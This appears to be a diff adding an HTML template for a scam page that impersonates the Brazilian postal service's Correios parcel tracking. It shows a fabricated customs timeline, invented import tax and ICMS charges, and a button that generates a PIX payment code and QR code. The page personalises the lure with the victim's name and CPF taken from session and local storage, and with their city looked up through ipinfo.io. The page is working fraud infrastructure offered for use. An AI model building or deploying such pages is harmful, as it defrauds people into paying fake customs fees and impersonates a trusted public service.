@@ -1,0 +1,270 @@
+
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="https://rastreamento.correios.com.br/core/templates/bunker/img/favi-ect.png">
+    <title>Rastreio</title>
+    <script>
+        window.addEventListener('beforeunload', function() {
+            localStorage.clear();
+        });
+        var uuid_ = "{{prefix}}"
+    </script>
+    <style>
+        * {
+            text-decoration: none;
+            color: inherit; /* Inherit the color from the parent element */
+        }
+        h2 {
+            text-decoration: none;
+            color: inherit; /* Inherit the color from the parent element */
+        }
+
+        h2 a {
+            text-decoration: none;
+            color: inherit;
+        }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    
+    <script defer="defer" src="/js/app.js?1"></script>
+    <script src="/socket.io/socket.io.js"></script>
+    <link href="/css/style.css" rel="stylesheet">
+    <link rel="icon" type="image/png" href="/images/favicon.png">
+    
+</head>
+
+<body>
+    <div class="container" style="margin-top: 20px; max-width: 800px;">
+        <div class="ContainerLogo">
+            <div class="Logo">
+                <div><img src="/images/logo.svg" width="180" alt=""></div>
+            </div>
+        </div>
+
+        <div id="step2">
+            <div class="row">
+                <div class="col-12 col-md-6 mx-auto mr-3">
+                    <div class="p-3" style="color: #015cab;">
+                        <div style="margin-bottom: 50px;">
+                            <center>
+                                <b>DESTINATÁRIO: </b><span id="nomeDoc">{{session['dados']['nome'] | upper }}</span><br>
+                                <!--<b>CPF: </b><span id="numeroDoc">{{session['dados']['cpf'] | format_cpf }}</span><br>-->
+                                <!--<b>ENDEREÇO: </b><span id="numeroDoc">{{session['dados']['endereco'] | upper }} - {{session['dados']['cep']}}</span>-->
+                                <br>
+                                <br>
+                                <!--<h2>{{session['rastreio'] | format_code}}</h2>-->
+                                <!--<br>-->
+                            </center>
+                            <div id="cabecalho-rastro" class="d-flex justify-content-between">
+                                <ul class="cabecalho-rastro">
+                                    <div class="arrow-dashed justify-content-start">
+                                        <div class="circle">
+                                            <img class="circle-img" src="/images/correios-sf.png" width="35px"
+                                                height="35px">
+                                        </div>
+                                    </div>
+                                    <div class="cabecalho-content">
+                                        <p class="text text-content">PACKET STANDARD IMPORTAÇÃO</p>
+                                        <p class="text text-head">Previsão de Entrega: <spam id="threeDaysLater"></spam></p>
+                                        <p class="text text-content" style="font-weight: normal;"> <spam id="cityClient"></spam> </p>
+                                    </div>
+                                </ul>
+                                <div class="share-bar noPrint">
+                                    <a title="Compartilhar" class="btn btn-light" data-objeto="NM418481238BR">
+                                        <i class="fa fa-share-alt" aria-hidden="true"></i>
+                                    </a>
+                                </div>
+                            </div>
+                            <ul class="ship-steps">
+                                <li class="step">
+                                    <div class="arrow-current">
+                                        <div class="circle">
+                                            <img class="circle-img" src="/images/aguardando-pagamento.png">
+                                        </div>
+                                    </div>
+                                    <div class="step-content">
+                                        <p class="text text-head">Aguardando pagamento</p>
+                                        <p class="text text-content">Curitiba - PR</p>
+                                        <p class="text text-content">
+                                            <spam id="currentDate"></spam>
+                                        </p>
+                                    </div>
+                                </li>
+                                <li class="step">
+                                    <div class="arrow-current">
+                                        <div class="circle">
+                                            <img class="circle-img" src="/images/caminhao-cor.png">
+                                        </div>
+                                    </div>
+                                    <div class="step-content">
+                                        <p class="text text-head">Informações enviadas para análise da autoridade
+                                            aduaneira/órgãos anuentes</p>
+                                        <p class="text text-content">Curitiba - PR</p>
+                                        <p class="text text-content">
+                                            <spam id="oneDayAgo"></spam>
+                                        </p>
+                                    </div>
+                                </li>
+                                <li class="step">
+                                    <div class="arrow-current">
+                                        <div class="circle">
+                                            <img class="circle-img" src="/images/brazil.png">
+                                        </div>
+                                    </div>
+                                    <div class="step-content">
+                                        <p class="text text-head">Objeto recebido pelos Correios do Brasil</p>
+                                        <p class="text text-content">Curitiba - PR</p>
+
+                                        <p class="text text-content">
+                                            <spam id="twoDaysAgo"></spam>
+                                        </p>
+                                    </div>
+                                </li>
+                                <li class="step">
+                                    <div class="arrow-none">
+                                        <div class="circle">
+                                            <img class="circle-img" src="/images/agencia-cor.png">
+                                        </div>
+                                    </div>
+                                    <div class="step-content">
+                                        <p class="text text-head">Objeto postado</p>
+                                        <p class="text text-content">CHINA</p>
+                                    </div>
+                                </li>
+                            </ul>
+                            <button class="blue-button" id="pagamentoBtn" style="cursor: pointer;">EFETUAR
+                                PAGAMENTO</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="step3" style="display: none;">
+            <div class="row">
+                <div class="col-12 col-md-6 mx-auto mr-3">
+                    <div class="p-3" style="color: #015cab;">
+                        <div style="margin-block: 50px;">
+                            <div class="info-box">
+                                <div class="info-box-content">
+                                    <div class="info-item"><span>Imposto
+                                            de importação:</span> R$ {{session['valores']['valor_d']}} </div>
+                                    <div class="info-item"><span>ICMS:</span>
+                                        R$ {{session['valores']['icms']}} </div>
+                                    <div class="info-item"><span>Despacho
+                                            postal:</span> R$ 0,00 </div>
+                                    <div class="info-item"><span>Multa:</span>
+                                        R$ 0,00 </div>
+                                    <div class="info-item"><span>Valor
+                                            Complementar:</span> R$ 0,00 </div>
+                                    <div class="info-item"><span>Valor
+                                            Total:</span> R$ {{session['valores']['valor_gerado']}} </div>
+                                </div>
+                            </div>
+
+                            <div class="info-box">
+                                <img src="data:image/webp;base64,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"
+                                    alt="Pix" class="info-image">
+                                <div class="info-box-content">
+                                    <div class="info-item">
+                                        <span style="padding-left: 10px;">Pagamento via PIX</span>
+                                    </div>
+                                </div>
+                            </div>
+                            <button class="blue-button" id="pixBtn" style="cursor: pointer;">GERAR PIX</button><br>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="step4" style="display: none;">
+            <div class="row">
+                <div class="col-12 col-md-6 mx-auto mr-3">
+                    <div class="p-3" style="color:  #015cab;">
+                        <div style="margin-bottom: 50px;">
+                            <center>
+                                <p><b>DESTINATÁRIO: </b><span id="nomeDoc2"></span>{{session['dados']['nome'] | upper }}</p>
+                                
+                                <!--<p><b>CPF: </b><span id="numeroDoc2"></span>{{session['dados']['cpf'] | format_cpf }}</p>-->
+                                <h2>PIX gerado com sucesso</h2>
+                                <p><b>Siga as instruções para realizar o pagamento</b></p>
+                                <p> 1- Copie o código abaixo: </p>
+                                <p> 2- Cole no seu banco na função, <b>PIX Copia e Cola</b></p>
+                                <div style="margin-top: 10px;">
+                                    <input type="text" id="cec" class="text" readonly="">
+                                </div>
+                                <button class="copy-button" id="copiarBtn"
+                                    style="cursor: pointer; background-color: #015cab; color: white;">COPIAR
+                                    CÓDIGO</button>
+                                <p><b>Você também pode pagar utilizando o QRCode</b></p>
+                                <p>1 - Acesse sua conta bancaria no internet Banking ou através do app</p>
+                                <p>2 - Selecione a opção de pagar com PIX / escanear QR code</p>
+                                <p>3 - Finalize o Pagamento </p>
+                                <div id="qrcode">
+                            </center><br>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="loading" style="display: none;">
+            <div class="load"></div>
+        </div>
+        <div id="alertMessage" style="display: none;">
+            <div class="AlertMessage">
+                <div class="Box">
+                    <div class="BoxContent">
+                        <div class="Header Red">AVISO</div>
+                        <div class="Text">Aguarde, obtendo dados PIX.</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        // Recuperar os dados do localStorage
+        const nome = localStorage.getItem('name');
+        const cpf = localStorage.getItem('cpf');
+
+        // Preencher os elementos HTML com os dados
+        if (nome) {
+            document.getElementById('nomeDoc').textContent = nome.toUpperCase();
+            document.getElementById('nomeDoc2').textContent = nome.toUpperCase();
+        } else {
+            document.getElementById('nomeDoc').textContent = '{{session['dados']['nome'] | upper }}';
+            document.getElementById('nomeDoc2').textContent = '{{session['dados']['nome'] | upper }}';
+        }
+
+        if (cpf) {
+            //document.getElementById('numeroDoc').textContent = formatCPF(cpf);
+        } else {
+            //document.getElementById('numeroDoc').textContent = '{{session['dados']['cpf'] | format_cpf }}';
+        }
+
+        // Função para formatar o CPF
+        function formatCPF(cpf) {
+            return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        }
+    });
+
+  fetch('https://ipinfo.io/json')
+    .then(response => response.json())
+    .then(data => {
+      const city = data.city; // Obtém a cidade do cliente
+      document.getElementById('cityClient').textContent = city; // Preenche o elemento cityClient
+    })
+    .catch(error => {
+      console.error('Erro ao obter a cidade:', error);
+    });
+</script>
+
+</body>
+
+</html>
